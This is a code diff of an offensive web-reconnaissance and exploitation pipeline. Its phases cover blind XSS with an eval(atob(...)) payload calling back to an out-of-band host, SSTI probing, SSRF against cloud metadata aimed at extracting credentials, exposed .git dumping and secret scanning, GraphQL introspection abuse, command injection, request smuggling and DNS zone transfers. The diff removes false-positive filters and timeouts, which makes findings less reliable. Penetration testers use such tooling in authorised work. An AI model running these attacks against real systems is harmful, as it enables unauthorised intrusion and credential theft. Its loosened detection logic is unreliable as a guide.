             f"OAST = {json.dumps(oast_domain)}\n"
             f"IN = {json.dumps(str(ssrf_in))}\n"
             "SSRF_PARAMS = {\n"
@@ -2908,14 +1822,22 @@ async def phase_11_INJECT(
             blind_script.write_text(
                 "#!/usr/bin/env python3\n"
                 '"""Blind XSS probe: Fire requests with XSS payloads that call back to OAST."""\n'
-                "import os, sys, urllib.request\n"
-                "# Proxy support: route through PROXY env var if set (HTTP/HTTPS only; SOCKS uses proxychains)\n"
+                "import os, sys, urllib.request, socket\n"
                 "_proxy = os.environ.get('PROXY', '')\n"
-                "if _proxy and _proxy.startswith(('http://', 'https://')):\n"
-                "    _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
-                "    _urlopen = urllib.request.build_opener(_handler).open\n"
-                "else:\n"
-                "    _urlopen = urllib.request.urlopen\n"
+                "_urlopen = urllib.request.urlopen\n"
+                "if _proxy:\n"
+                "    if _proxy.startswith(('http://', 'https://')):\n"
+                "        _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
+                "        _urlopen = urllib.request.build_opener(_handler).open\n"
+                "    elif _proxy.startswith(('socks4://', 'socks5://', 'socks5h://', 'socks4a://')):\n"
+                "        try:\n"
+                "            import socks as _socks\n"
+                "            _parsed = urllib.parse.urlparse(_proxy)\n"
+                "            _pt = _socks.SOCKS5 if _parsed.scheme.startswith('socks5') else _socks.SOCKS4\n"
+                "            _socks.set_default_proxy(_pt, _parsed.hostname, _parsed.port or 1080)\n"
+                "            _socks.wrap_module(socket)\n"
+                "        except ImportError:\n"
+                "            pass\n"
                 f"OAST = {json.dumps(oast_domain)}\n"
                 f"IN = {json.dumps(str(blind_xss_in))}\n"
                 f'import os; PAYLOAD = os.environ.get("BLIND_XSS_PAYLOAD") or f\'"><img src=x onerror=eval(atob("{_xss_b64}"))>\'\n'
@@ -3111,12 +2033,14 @@ async def phase_12_SSTI(
     all_urls = read_lines(urls) if urls.exists() else []
     if not all_urls:
         log("warn", "12-SSTI: no URLs; skipping")
-        return {"12-SSTI": str(outdir / "ssti.txt"), "count": 0}
+        ensure(_g2_out).write_text("")
+        return {"12-SSTI": str(_g2_out), "count": 0}
     all_urls = _dedupe_by_host_params(all_urls)
     param_urls = [u for u in all_urls if "=" in u]
     if not param_urls:
         log("warn", "12-SSTI: no param-bearing URLs; skipping")
-        return {"12-SSTI": str(outdir / "ssti.txt"), "count": 0}
+        ensure(_g2_out).write_text("")
+        return {"12-SSTI": str(_g2_out), "count": 0}
 
     eval_map = {
         "{{7*7}}": "49",
@@ -3133,23 +2057,11 @@ async def phase_12_SSTI(
     _ssti_extra_headers = _extra_headers_dict()
     _ssti_urlopen = _get_urlopener()
 
-    # Baseline check: fetch original URL first to see if expected values appear naturally
-    baseline_bodies: Dict[str, str] = {}
-    for u in param_urls[:20]:
-        try:
-            req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_ssti_extra_headers})
-            _, _, body_bytes = await _async_urlopen(_ssti_urlopen, req, timeout=15)
-            baseline_bodies[u.split("?")[0]] = body_bytes.decode("utf-8", errors="ignore")
-        except Exception:
-            continue
-
     for u in param_urls:
         parsed = urllib.parse.urlparse(u)
         qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
         if not qs:
             continue
-        base_path = u.split("?")[0]
-        baseline_body = baseline_bodies.get(base_path, "")
         for param_name in qs:
             for payload, expected in eval_map.items():
                 test_qs = qs.copy()
@@ -3169,12 +2081,7 @@ async def phase_12_SSTI(
                     )
                     _, _, body_bytes = await _async_urlopen(_ssti_urlopen, req, timeout=15)
                     body = body_bytes.decode("utf-8", errors="ignore")
-                    # Skip if expected value appeared in the baseline (false positive)
-                    if expected in baseline_body:
-                        continue
-                    # Only report if the payload itself is NOT in the body (meaning it was evaluated)
-                    # AND the expected result IS in the body
-                    if payload not in body and expected in body:
+                    if expected in body:
                         ssti_findings.append(
                             f"[SSTI-evaluated] {test_url} param={param_name} payload={payload} → {expected}"
                         )
@@ -3190,52 +2097,6 @@ async def phase_12_SSTI(
     )
     log("ok", f"12-SSTI: {len(ssti_findings)} SSTI reflections detected")
     return {"12-SSTI": str(outdir / "ssti.txt"), "count": len(ssti_findings)}
-
-
-# ─────────────────────────── manual-testing phases ──────────────────────────
-# Phases 14-ORIGIN–L address gaps that automated scanners often miss but can be
-# partially automated with targeted scripts and API calls.
-# ───────────────────── Phase 14-ORIGIN: origin IP bypass ────────────────────────────
-def _mmh3_hash(data: bytes) -> int:
-    """Python implementation of mmh3 hash (used by Shodan favicon lookup)."""
-    seed = 0
-    c1 = 0xCC9E2D51
-    c2 = 0x1B873593
-    r1 = 15
-    r2 = 13
-    m = 5
-    n = 0xE6546B64
-    h = seed
-    length = len(data)
-    nblocks = length // 4
-    for i in range(nblocks):
-        k = struct.unpack_from("<I", data, i * 4)[0]
-        k = (k * c1) & 0xFFFFFFFF
-        k = ((k << r1) | (k >> (32 - r1))) & 0xFFFFFFFF
-        k = (k * c2) & 0xFFFFFFFF
-        h ^= k
-        h = ((h << r2) | (h >> (32 - r2))) & 0xFFFFFFFF
-        h = (h * m + n) & 0xFFFFFFFF
-    tail = data[nblocks * 4 :]
-    k = 0
-    tail_len = length & 3
-    if tail_len == 3:
-        k ^= tail[2] << 16
-    if tail_len >= 2:
-        k ^= tail[1] << 8
-    if tail_len >= 1:
-        k ^= tail[0]
-        k = (k * c1) & 0xFFFFFFFF
-        k = ((k << r1) | (k >> (32 - r1))) & 0xFFFFFFFF
-        k = (k * c2) & 0xFFFFFFFF
-        h ^= k
-    h ^= length
-    h ^= h >> 16
-    h = (h * 0x85EBCA6B) & 0xFFFFFFFF
-    h ^= h >> 13
-    h = (h * 0xC2B2AE35) & 0xFFFFFFFF
-    h ^= h >> 16
-    return h
 
 
 async def phase_13_OOB(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, oast: Interactsh, force: bool = False) -> Dict[str, Any]:
@@ -3254,6 +2115,10 @@ async def phase_13_OOB(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, o
     return {"13-OOB": str(out), "count": n}
 
 
+# ─────────────────────────── manual-testing phases ──────────────────────────
+# Phases 14-ORIGIN–L address gaps that automated scanners often miss but can be
+# partially automated with targeted scripts and API calls.
+# ───────────────────── Phase 14-ORIGIN: origin IP bypass ────────────────────────────
 async def phase_14_ORIGIN(
     domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
 ) -> Dict[str, Any]:
@@ -3363,12 +2228,9 @@ async def phase_14_ORIGIN(
     mx_file = outdir / "mx_records.txt"
     _DNS_RESOLVER = os.environ.get("DNS_RESOLVER", "@8.8.8.8")
     if t.has("dig"):
+        _dig_cmd = _proxify_cmd(["dig", "+short", _DNS_RESOLVER, "mx", domain])
         proc = await asyncio.create_subprocess_exec(
-            "dig",
-            "+short",
-            _DNS_RESOLVER,
-            "mx",
-            domain,
+            *_dig_cmd,
             stdin=asyncio.subprocess.DEVNULL,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.DEVNULL,
@@ -3390,11 +2252,9 @@ async def phase_14_ORIGIN(
                     mx_host = (ln.split()[-1] if len(ln.split()) > 1 else ln).rstrip(".")
                     if t.has("dig"):
                         try:
+                            _dig2_cmd = _proxify_cmd(["dig", "+short", _DNS_RESOLVER, mx_host.rstrip(".")])
                             proc2 = await asyncio.create_subprocess_exec(
-                                "dig",
-                                "+short",
-                                _DNS_RESOLVER,
-                                mx_host.rstrip("."),
+                                *_dig2_cmd,
                                 stdin=asyncio.subprocess.DEVNULL,
                                 stdout=asyncio.subprocess.PIPE,
                                 stderr=asyncio.subprocess.DEVNULL,
@@ -3411,8 +2271,9 @@ async def phase_14_ORIGIN(
     # 3b. DNS zone transfer attempt (AXFR) — low success rate but high impact
     if t.has("dig"):
         try:
+            _ns_cmd = _proxify_cmd(["dig", "+short", _DNS_RESOLVER, "ns", domain])
             ns_proc = await asyncio.create_subprocess_exec(
-                "dig", "+short", _DNS_RESOLVER, "ns", domain,
+                *_ns_cmd,
                 stdin=asyncio.subprocess.DEVNULL,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.DEVNULL,
@@ -3423,8 +2284,9 @@ async def phase_14_ORIGIN(
                 if not ns or not _is_valid_hostname(ns):
                     continue
                 try:
+                    _axfr_cmd = _proxify_cmd(["dig", "axfr", f"@{ns}", domain])
                     axfr_proc = await asyncio.create_subprocess_exec(
-                        "dig", "axfr", f"@{ns}", domain,
+                        *_axfr_cmd,
                         stdin=asyncio.subprocess.DEVNULL,
                         stdout=asyncio.subprocess.PIPE,
                         stderr=asyncio.subprocess.DEVNULL,
@@ -3451,8 +2313,9 @@ async def phase_14_ORIGIN(
             query = f"_dmarc.{domain}" if label == "DMARC" else (
                 f"default._domainkey.{domain}" if label == "DKIM" else domain)
             try:
+                _sp_cmd = _proxify_cmd(["dig", "+short", _DNS_RESOLVER, "txt", query])
                 sp_proc = await asyncio.create_subprocess_exec(
-                    "dig", "+short", _DNS_RESOLVER, "txt", query,
+                    *_sp_cmd,
                     stdin=asyncio.subprocess.DEVNULL,
                     stdout=asyncio.subprocess.PIPE,
                     stderr=asyncio.subprocess.DEVNULL,
@@ -4275,17 +3138,8 @@ async def phase_17b_SSRFMETA(
                     req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_ss_extra_headers})
                     meta_status, meta_headers, meta_body = await _async_urlopen(_ss_urlopen, req, timeout=15)
                     meta_text = meta_body.decode("utf-8", errors="ignore")
-                    # Filter out login pages and error pages (false positives)
-                    login_indicators = ["login", "password", "passwort", "csrf", "sign in", "anmelden", "authenticate"]
-                    if any(ind in meta_text.lower() for ind in login_indicators) and "iam/" not in meta_text and "security-credentials" not in meta_text:
-                        continue
                     # If we got data back that looks like cloud metadata
                     if meta_status == 200 and len(meta_text) > 20:
-                        # Require actual cloud metadata indicators
-                        meta_indicators = ["iam/", "security-credentials", "accesskey", "secretkey", "aws", "gcp", "azure",
-                                           "digitalocean", "meta-data", "computeMetadata", "InstanceMetadata"]
-                        if not any(ind in meta_text.lower().replace(" ", "") for ind in meta_indicators):
-                            continue
                         findings.append(f"[credential-exfil] {cloud_name} via {test_url}")
                         findings.append(f"  status={meta_status} body_length={len(meta_text)}")
                         # Extract sensitive patterns
@@ -4461,11 +3315,12 @@ async def phase_19_GIT(
                     headers={"User-Agent": "Mozilla/5.0"})
                 git_status, _, _ = await _async_urlopen(_no_redirect_urlopen, req, timeout=10)
                 if git_status == 200:
-                    # Verify it's actual git content, not a custom 200 page
                     results.append(f"[.git-exposed] {test_url} (HTTP {git_status})")
                     break
-            except urllib.error.HTTPError:
-                pass
+            except urllib.error.HTTPError as e:
+                if e.code in (200, 301, 302):
+                    results.append(f"[.git-exposed] {test_url} (HTTP {e.code})")
+                    break
             except Exception:
                 continue
         # If .git is exposed, try to download it
@@ -4478,7 +3333,7 @@ async def phase_19_GIT(
                 ["gitdumper", git_base, str(dump_dir)],
                 300, outdir,
             )
-            if dump_dir.exists() and list(dump_dir.iterdir()) and any(f.stat().st_size > 0 for f in dump_dir.iterdir()):
+            if dump_dir.exists() and list(dump_dir.iterdir()):
                 results.append(f"[git-dumped] {git_base} → {dump_dir}")
                 # Run trufflehog on the dumped repo
                 if t.has("trufflehog"):
@@ -4550,13 +3405,12 @@ async def phase_20_GRAPHQL(
     if not targets:
         log("warn", "Phase 20-GRAPHQL: no HTTP targets; skipping")
         return {"20-GRAPHQL": str(_o_out), "count": 0}
-    # inql integration (parallel)
+    # inql integration
     if t.has("inql"):
         inql_out = outdir / "inql_results"
         inql_out.mkdir(parents=True, exist_ok=True)
-        inql_jobs = []
         for tgt in targets:
-            for ep in _GRAPHQL_ENDPOINTS[:5]:  # limit to 5 most common endpoints
+            for ep in _GRAPHQL_ENDPOINTS:
                 url = f"{tgt}{ep}"
                 runner = outdir / "logs" / f"inql_{_safe_name(url)}_runner.sh"
                 ensure(runner)
@@ -4565,19 +3419,20 @@ async def phase_20_GRAPHQL(
                     "set -eu\n"
                     f"URL={shlex.quote(url)}\n"
                     f"OUT={shlex.quote(str(inql_out))}\n"
-                    'timeout 120 inql -t "$URL" -o "$OUT" 2>/dev/null || true\n'
+                    'inql -t "$URL" -o "$OUT" 2>/dev/null || true\n'
                 )
                 runner.chmod(0o755)
-                inql_jobs.append((f"inql-{_safe_name(url)}", ["bash", str(runner)], 180))
-        if inql_jobs:
-            await run_parallel(inql_jobs, outdir)
-    # Clairvoyance GraphQL introspection abuse (parallel)
+                await _run(
+                    f"inql-{_safe_name(url)}",
+                    ["bash", str(runner)],
+                    300, outdir,
+                )
+    # Clairvoyance GraphQL introspection abuse
     if t.has("clairvoyance"):
         clairvoyance_out = outdir / "clairvoyance_results"
         clairvoyance_out.mkdir(parents=True, exist_ok=True)
-        cv_jobs = []
         for tgt in targets:
-            for ep in _GRAPHQL_ENDPOINTS[:5]:  # limit to 5 most common endpoints
+            for ep in _GRAPHQL_ENDPOINTS:
                 url = f"{tgt}{ep}"
                 cv_out = clairvoyance_out / f"{_safe_name(url)}.json"
                 runner = outdir / "logs" / f"clairvoyance_{_safe_name(url)}_runner.sh"
@@ -4587,12 +3442,14 @@ async def phase_20_GRAPHQL(
                     "set -eu\n"
                     f"URL={shlex.quote(url)}\n"
                     f"OUT={shlex.quote(str(cv_out))}\n"
-                    'timeout 120 clairvoyance "$URL" -o "$OUT" 2>/dev/null || true\n'
+                    'clairvoyance "$URL" -o "$OUT" 2>/dev/null || true\n'
                 )
                 runner.chmod(0o755)
-                cv_jobs.append((f"clairvoyance-{_safe_name(url)}", ["bash", str(runner)], 180))
-        if cv_jobs:
-            await run_parallel(cv_jobs, outdir)
+                await _run(
+                    f"clairvoyance-{_safe_name(url)}",
+                    ["bash", str(runner)],
+                    300, outdir,
+                )
         cv_reports = list(clairvoyance_out.glob("*.json"))
         if cv_reports:
             findings.append(f"[clairvoyance] {len(cv_reports)} schema reports → {clairvoyance_out}")
@@ -4609,13 +3466,13 @@ async def phase_20_GRAPHQL(
                 "set -eu\n"
                 f"TARGET={shlex.quote(tgt)}\n"
                 f"OUT={shlex.quote(str(out_file))}\n"
-                'timeout 120 graphinder -t "$TARGET" -o "$OUT" 2>/dev/null || true\n'
+                'graphinder -t "$TARGET" -o "$OUT" 2>/dev/null || true\n'
             )
             runner.chmod(0o755)
             await _run(
                 f"graphinder-{_safe_name(tgt)}",
                 ["bash", str(runner)],
-                180, outdir,
+                300, outdir,
             )
         gi_reports = list(graphinder_out.glob("*.json"))
         if gi_reports:
@@ -5197,11 +4054,7 @@ async def phase_26_CMDINJECT(
     findings: List[str] = []
     _c_urlopen = _get_urlopener()
     _cmdi_extra_headers = _extra_headers_dict()
-    _STATIC_ASSET_EXTS = (".ttf", ".woff", ".woff2", ".eot", ".svg", ".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".ico", ".webp", ".mp4", ".avi", ".mov", ".pdf", ".zip", ".gz", ".tar", ".map")
-    _STATIC_PARAM_NAMES = {"v", "ver", "version", "_"}
-    param_urls = [u for u in all_urls if "=" in u and not u.lower().rstrip("?&").split("?")[0].endswith(_STATIC_ASSET_EXTS)][:_PIPELINE_CFG.sample_urls_cmdi]
-    # Filter out URLs where the ONLY parameter is a version indicator
-    param_urls = [u for u in param_urls if not all(p.split("=")[0] in _STATIC_PARAM_NAMES for p in u.split("?", 1)[1].split("&") if "=" in p)]
+    param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_cmdi]
     if t.has("commix") and param_urls:
         commix_outdir = outdir / "logs" / "commix"
         commix_outdir.mkdir(parents=True, exist_ok=True)
@@ -6160,10 +5013,11 @@ async def phase_38_SMUGGLE(
                         findings.append(f"[smuggler] {ln.strip()}")
     for host in targets:
         host_clean = host.split(":")[0] if ":" in host else host
+        host_safe = host_clean.replace("\r", "").replace("\n", "").replace("{", "{{").replace("}", "}}")
         try:
             import socket as _socket
             for smuggle_type, raw_payload in [("CL.TE", _SMUGGLE_CL_TE_PAYLOAD), ("TE.CL", _SMUGGLE_TE_CL_PAYLOAD)]:
-                payload = raw_payload.format(host=host_clean)
+                payload = raw_payload.format(host=host_safe)
                 sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                 sock.settimeout(8)
                 try:
@@ -6421,8 +5275,9 @@ async def phase_41_WEBSOCKET(
     for host in hosts:
         host_clean = host.split(":")[0] if ":" in host else host
         for ws_path in _WS_COMMON_PATHS:
+            ws_host_safe = host_clean.replace("\r", "").replace("\n", "")
             for scheme in ("wss", "ws"):
-                ws_url = f"{scheme}://{host_clean}{ws_path}"
+                ws_url = f"{scheme}://{ws_host_safe}{ws_path}"
                 try:
                     import socket as _socket
                     import ssl as _ssl
@@ -6445,7 +5300,7 @@ async def phase_41_WEBSOCKET(
                     ws_key = _b64.b64encode(os.urandom(16)).decode()
                     upgrade_request = (
                         f"GET {ws_path} HTTP/1.1\r\n"
-                        f"Host: {host_clean}\r\n"
+                        f"Host: {ws_host_safe}\r\n"
                         f"Upgrade: websocket\r\n"
                         f"Connection: Upgrade\r\n"
                         f"Sec-WebSocket-Key: {ws_key}\r\n"
@@ -6601,406 +5456,6 @@ async def phase_43_DESERIAL(
     return {"43-DESERIAL": str(out), "count": len(findings)}
 
 
-# ─────────────────────────── Progress Persistence ─────────────────────────
-_SCAN_STATUS_DIR = Path(
-    os.environ.get("XDG_RUNTIME_DIR") or os.environ.get("TMPDIR") or "/tmp"
-) / "reconchain_status"
-
-
-class ScanStatus:
-    """Lightweight progress persistence for terminal-reconnect support.
-    Writes live progress to /tmp/reconchain_status/<domain>.json so that
-    a second terminal running `--status <domain>` can display live state."""
-
-    def __init__(self, domain: str, outdir: Path) -> None:
-        self.domain = domain
-        self.outdir = outdir
-        _SCAN_STATUS_DIR.mkdir(parents=True, exist_ok=True)
-        self._path = _SCAN_STATUS_DIR / f"{domain.replace('.', '_')}.json"
-        self._data: Dict[str, Any] = {
-            "domain": domain,
-            "outdir": str(outdir),
-            "started_at": datetime.now().isoformat(timespec="seconds"),
-            "updated_at": datetime.now().isoformat(timespec="seconds"),
-            "phase": "",
-            "phase_progress": "",
-            "completed_phases": [],
-            "running_phases": [],
-            "total_phases": 0,
-            "errors": [],
-            "missing_tools": [],
-        }
-        self._write()
-
-    def _write(self) -> None:
-        self._data["updated_at"] = datetime.now().isoformat(timespec="seconds")
-        try:
-            _SCAN_STATUS_DIR.mkdir(parents=True, exist_ok=True)
-            tmp = self._path.with_suffix(self._path.suffix + ".tmp")
-            tmp.write_text(json.dumps(self._data, indent=2, default=str))
-            os.replace(tmp, self._path)
-        except Exception as exc:
-            log("err", f"ScanStatus write failed: {exc}")
-            self._data.setdefault("write_errors", []).append(str(exc))
-
-    def set_phase(self, name: str) -> None:
-        self._data["phase"] = name
-        self._data["phase_progress"] = ""
-        self._write()
-
-    def set_progress(self, msg: str) -> None:
-        self._data["phase_progress"] = msg
-        self._write()
-
-    def add_completed(self, name: str) -> None:
-        if name not in self._data["completed_phases"]:
-            self._data["completed_phases"].append(name)
-        if name in self._data["running_phases"]:
-            self._data["running_phases"].remove(name)
-        self._write()
-
-    def add_running(self, name: str) -> None:
-        if name not in self._data["running_phases"]:
-            self._data["running_phases"].append(name)
-        self._write()
-
-    def set_total(self, n: int) -> None:
-        self._data["total_phases"] = n
-        self._write()
-
-    def add_error(self, err: str) -> None:
-        self._data["errors"].append(err)
-        self._write()
-
-    def set_missing(self, tools: List[str]) -> None:
-        self._data["missing_tools"] = sorted(set(tools))
-        self._write()
-
-    def close(self) -> None:
-        self._data["status"] = "completed"
-        self._write()
-        # Clean up status file for completed scans
-        with contextlib.suppress(Exception):
-            self._path.unlink(missing_ok=True)
-
-    @classmethod
-    def load(cls, domain: str) -> Optional[Dict[str, Any]]:
-        path = _SCAN_STATUS_DIR / f"{domain.replace('.', '_')}.json"
-        if path.exists():
-            try:
-                return json.loads(path.read_text(encoding="utf-8", errors="ignore"))
-            except (json.JSONDecodeError, ValueError):
-                pass
-        return None
-
-    @classmethod
-    def list_active(cls) -> List[Dict[str, Any]]:
-        results: List[Dict[str, Any]] = []
-        if not _SCAN_STATUS_DIR.exists():
-            return results
-        for f in sorted(_SCAN_STATUS_DIR.glob("*.json")):
-            try:
-                data = json.loads(f.read_text(encoding="utf-8", errors="ignore"))
-                if data.get("status") != "completed":
-                    results.append(data)
-            except Exception:
-                continue
-        return results
-
-
-# ───────────────────────────── report writers ──────────────────────────────
-def _counts(outdir: Path) -> Dict[str, int]:
-    keys = {
-        "subdomains": outdir / "all_subs.txt",
-        "resolved": outdir / "resolved.txt",
-        "open_ports": outdir / "ports.txt",
-        "services": outdir / "services.txt",
-        "live_hosts": outdir / "hosts.txt",
-        "tech": outdir / "tech.txt",
-        "takeover": outdir / "takeover.txt",
-        "urls": outdir / "urls_all.txt",
-        "js_urls": outdir / "urls_js.txt",
-        "js_secrets": outdir / "js_secrets.txt",
-        "js_deep": outdir / "js_secrets_deep.txt",
-        "params": outdir / "params.txt",
-        "fuzz": outdir / "fuzz.txt",
-        "nuclei": outdir / "nuclei_combined.txt",
-        "tls_wp": outdir / "tls_wp.txt",
-        "ssti": outdir / "ssti.txt",
-        "origin": outdir / "origin.txt",
-        "auth_bypass": outdir / "auth_bypass.txt",
-        "vulns": outdir / "vulns.txt",
-        "oast": outdir / "oast" / "callbacks.txt",
-        "cloud_buckets": outdir / "cloud_buckets.txt",
-        "git_exposure": outdir / "git_exposure.txt",
-        "graphql": outdir / "graphql_introspection.txt",
-        "waf": outdir / "waf_detection.txt",
-        "nosqli": outdir / "nosqli.txt",
-        "race": outdir / "race_conditions.txt",
-        "jwt": outdir / "jwt_analysis.txt",
-        "xxe": outdir / "xxe.txt",
-        "cmdi": outdir / "cmd_injection.txt",
-        "sspp": outdir / "sspp.txt",
-        "cached": outdir / "cache_poison.txt",
-        "depcheck": outdir / "depcheck.txt",
-        "open_redirect": outdir / "open_redirect.txt",
-        "clickjacking": outdir / "clickjacking.txt",
-        "crlf": outdir / "crlf_injection.txt",
-        "rate_limiting": outdir / "rate_limiting.txt",
-        "cors_advanced": outdir / "cors_advanced.txt",
-        "jwt_advanced": outdir / "jwt_advanced.txt",
-        "file_upload": outdir / "file_upload.txt",
-        "smuggling": outdir / "smuggling.txt",
-        "oauth": outdir / "oauth_misconfig.txt",
-        "password_reset": outdir / "password_reset.txt",
-        "websocket": outdir / "websocket.txt",
-        "ldap": outdir / "ldap_injection.txt",
-        "deserialization": outdir / "deserialization.txt",
-        "takeover_confirmed": outdir / "takeover_confirmed.txt",
-        "api_specs": outdir / "api_specs.txt",
-        "sqlmap": outdir / "sqlmap_findings.txt",
-        "idor": outdir / "idor.txt",
-        "ssrf_meta": outdir / "ssrf_meta.txt",
-        "lfi": outdir / "lfi.txt",
-        "mass_assign": outdir / "mass_assign.txt",
-        "authz_bypass": outdir / "authz_bypass.txt",
-        "chain_correlation": outdir / "chain_correlation.txt",
-        "evidence": outdir / "evidence.txt",
-    }
-    # Use count_nonblank() instead of len(read_lines()) so `#`-prefixed
-    # entries (e.g. a subfinder banner) aren't silently dropped from
-    # the report. We still skip files that don't exist.
-    return {k: count_nonblank(v) for k, v in keys.items() if v.exists()}
-
-
-def write_summary(outdir: Path, domain: str, state: dict, counts: Dict[str, int]) -> Path:
-    payload = {
-        "domain": domain,
-        "generated_at": datetime.now().isoformat(timespec="seconds"),
-        "toolchain": f"reconchain v{__version__}",
-        "missing_tools": sorted(set(state.get("missing_tools", []))),
-        "tool_failures": dict(state.get("tool_failures", {})),
-        "artifacts": {k: v for k, v in state.get("artifacts", {}).items()},
-        "counts": counts,
-    }
-    out = ensure(outdir / "summary.json")
-    out.write_text(json.dumps(payload, indent=2, default=str))
-    return out
-
-
-HTML_CSS = """
-:root{--fg:#e6edf3;--bg:#0d1117;--mut:#8b949e;--acc:#58a6ff;--warn:#d29922;--ok:#3fb950;--err:#f85149;}
-*{box-sizing:border-box}body{font-family:ui-monospace,Menlo,Consolas,monospace;
-background:var(--bg);color:var(--fg);margin:0;padding:32px;line-height:1.5}
-h1{font-size:1.6em;margin:0 0 4px;color:var(--acc)}
-h2{font-size:1.2em;border-bottom:1px solid #30363d;padding-bottom:6px;margin-top:32px}
-small{color:var(--mut)}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;margin-top:12px}
-.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px}
-.card b{color:var(--acc);font-size:1.4em;display:block}.card span{color:var(--mut);font-size:.85em}
-pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;overflow:auto;font-size:.85em;max-height:480px}
-.miss{color:var(--warn)}footer{margin-top:48px;color:var(--mut);font-size:.8em}
-"""
-
-
-def html_escape(s: str) -> str:
-    return (
-        s.replace("&", "&amp;")
-        .replace("<", "&lt;")
-        .replace(">", "&gt;")
-        .replace('"', "&quot;")
-        .replace("'", "&#39;")
-    )
-
-
-def write_html(outdir: Path, domain: str, counts: Dict[str, int], missing: List[str]) -> Path:
-    cards = "\n".join(
-        f'<div class="card"><b>{n}</b><span>{html_escape(k)}</span></div>'
-        for k, n in counts.items()
-    )
-    sections = []
-    for key in (
-        "all_subs.txt",
-        "resolved.txt",
-        "hosts.txt",
-        "ports.txt",
-        "takeover.txt",
-        "takeover_confirmed.txt",
-        "urls_all.txt",
-        "api_specs.txt",
-        "js_secrets.txt",
-        "js_secrets_deep.txt",
-        "params.txt",
-        "fuzz.txt",
-        "nuclei_combined.txt",
-        "tls_wp.txt",
-        "ssti.txt",
-        "origin.txt",
-        "authz_bypass.txt",
-        "mass_assign.txt",
-        "idor.txt",
-        "ssrf_meta.txt",
-        "services.txt",
-        "vulns.txt",
-        "sqlmap_findings.txt",
-        "cloud_buckets.txt",
-        "git_exposure.txt",
-        "graphql_introspection.txt",
-        "waf_detection.txt",
-        "nosqli.txt",
-        "race_conditions.txt",
-        "jwt_analysis.txt",
-        "xxe.txt",
-        "cmd_injection.txt",
-        "sspp.txt",
-        "cache_poison.txt",
-        "depcheck.txt",
-        "lfi.txt",
-        "open_redirect.txt",
-        "clickjacking.txt",
-        "crlf_injection.txt",
-        "rate_limiting.txt",
-        "cors_advanced.txt",
-        "jwt_advanced.txt",
-        "file_upload.txt",
-        "smuggling.txt",
-        "oauth_misconfig.txt",
-        "password_reset.txt",
-        "websocket.txt",
-        "ldap_injection.txt",
-        "deserialization.txt",
-        "chain_correlation.txt",
-        "evidence.txt",
-    ):
-        p = outdir / key
-        if p.exists():
-            txt = p.read_text(encoding="utf-8", errors="ignore")
-            if len(txt) > 50_000:
-                txt = txt[:50_000] + "\n[…truncated…]"
-            sections.append(f"<h2>{html_escape(key)}</h2><pre>{html_escape(txt)}</pre>")
-    # OAST callbacks section
-    oast_file = outdir / "oast" / "callbacks.txt"
-    if oast_file.exists() and count_nonblank(oast_file):
-        txt = oast_file.read_text(encoding="utf-8", errors="ignore")
-        sections.append(f"<h2>oast/callbacks.txt</h2><pre>{html_escape(txt)}</pre>")
-    miss_html = (
-        "<p class='miss'>missing: " + ", ".join(html_escape(m) for m in missing) + "</p>"
-        if missing
-        else ""
-    )
-    html = f"""<!doctype html>
-<html lang="en"><head><meta charset="utf-8">
-<title>recon report — {html_escape(domain)}</title>
-<style>{HTML_CSS}</style></head><body>
-<h1>Recon Report: {html_escape(domain)}</h1>
-<small>generated {datetime.now().isoformat(timespec="seconds")} · reconchain v{__version__}</small>
-{miss_html}
-<h2>Summary</h2><div class="grid">{cards}</div>
-{"".join(sections)}
-<footer>chained recon · all artifacts in <code>{html_escape(str(outdir))}</code></footer>
-</body></html>"""
-    out = ensure(outdir / "report.html")
-    out.write_text(html)
-    return out
-
-
-def write_full_summary(outdir: Path, domain: str, counts: Dict[str, int], missing: List[str]) -> Path:
-    lines = [
-        "=" * 60,
-        f"  Recon Summary — {domain}",
-        f"  generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-        "=" * 60,
-        "",
-    ]
-    if missing:
-        lines += ["⚠ MISSING TOOLS (install via ./install.sh)", ""]
-        for m in missing:
-            lines.append(f"  • {m}")
-        lines.append("")
-    lines += ["RESULTS", "-------", ""]
-    if counts:
-        lines.append(f"{'Artifact':<30} {'Count':>8}")
-        lines.append("-" * 40)
-        for k, n in sorted(counts.items()):
-            lines.append(f"{k:<30} {n:>8}")
-    lines.append("")
-    # Append first few lines of each non-empty artifact for quick reference
-    lines += ["KEY FINDINGS", "------------", ""]
-    for key in (
-        "all_subs.txt", "resolved.txt", "hosts.txt", "ports.txt",
-        "takeover.txt", "takeover_confirmed.txt", "urls_all.txt", "urls_js.txt",
-        "js_secrets.txt", "js_secrets_deep.txt", "params.txt",
-        "fuzz.txt", "nuclei_combined.txt", "tls_wp.txt",
-        "origin.txt", "authz_bypass.txt", "mass_assign.txt", "idor.txt",
-        "vulns.txt", "sqlmap_findings.txt", "ssrf_meta.txt", "ssti.txt",
-        "cloud_buckets.txt", "git_exposure.txt", "graphql_introspection.txt", "waf_detection.txt",
-        "nosqli.txt", "race_conditions.txt", "jwt_analysis.txt", "xxe.txt",
-        "cmd_injection.txt", "sspp.txt", "cache_poison.txt", "depcheck.txt",
-        "lfi.txt", "api_specs.txt",
-        "open_redirect.txt", "clickjacking.txt", "crlf_injection.txt",
-        "rate_limiting.txt", "cors_advanced.txt", "jwt_advanced.txt",
-        "file_upload.txt", "smuggling.txt", "oauth_misconfig.txt",
-        "password_reset.txt", "websocket.txt", "ldap_injection.txt",
-        "deserialization.txt", "chain_correlation.txt", "evidence.txt",
-    ):
-        p = outdir / key
-        if not p.exists():
-            continue
